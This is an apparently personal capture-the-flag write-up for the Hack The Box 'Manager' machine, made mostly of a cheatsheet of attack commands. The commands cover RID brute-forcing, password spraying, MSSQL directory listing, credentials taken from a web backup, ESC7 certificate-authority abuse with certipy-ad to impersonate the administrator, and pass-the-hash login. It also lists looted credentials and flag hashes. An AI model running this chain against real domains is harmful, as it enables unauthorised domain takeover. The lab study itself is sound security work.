# Manager \[Medium]

## Report

Username bruteforcing using rid and username password spraying using nxc shows same userpass combo for 'operator'. With MSSQL being an open service, login to find the source of the entire website hosted on port 80. We also find a backup zip file that exposes creds for 'raven'.

Raven has vulnerable certificate permissions and exploits the 'ESC7' to extract hash for admin. PtH and become admin.

## Cheatsheet

```
7h skew on all services - ldap, mssql and kerberos

python3 mssqlclient.py manager.htb/operator:operator@manager.htb -windows-auth

EXEC master.sys.xp_dirtree 'C:\inetpub\wwwroot',1, 1

nxc smb 10.10.11.236 -u guest -p '' --rid-brute
either shouldve converted all to lowercase first or check all possibilities

wget http://manager.htb/website-backup-27-07-23-old.zip
read .oldconf.xml

certipy-ad find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
ESC7 exploit
certipy-ad ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Raven has to be added to ManageCertificates otherwise this wont work
certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
certipy-ad ca -ca manager-DC01-CA -issue-request 22 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.10.11.236 -template SubCA  -retrieve 22 -dc-ip 10.10.11.236
certipy-ad auth -pfx administrator.pfx  -dc-ip 10.10.11.236

faketime -f '+7h' certipy-ad auth -pfx administrator.pfx  -dc-ip 10.10.11.236
evil-winrm -i manager.htb -u Administrator -H ae5064c2f62317332c88629e025924ef


32fc60dd757857bab61c59d2402df2e4
339b176064fc5ebb2b25909d3fb368d2

```

## Loot

### Creds

```
operator:operator
raven:R4v3nBe5tD3veloP3r!123
```

### Enum

```
SMB
no guest access

rpcclient
access denied [guest]
nothing much as operator

ldap
dont work with our ldapsearch
ldapdomaindump -u management.htb\\operator -p 'operator' 10.10.11.236 -o ldap/

kerb (88)
no asreproast after ridbrute userlist
./kerbrute_linux_amd64 userenum -d manager.htb ~/htb/rooms/manager/users --dc manager.htb -v
/GetNPUsers.py 'manager.htb/' -dc-ip manager.htb -usersfile ~/htb/rooms/manager/users

mssql
need a username password combo
```

### Proof

Certify.exe didn't technically throw a vulnerable result so certipy-ad is also added to the arsenal
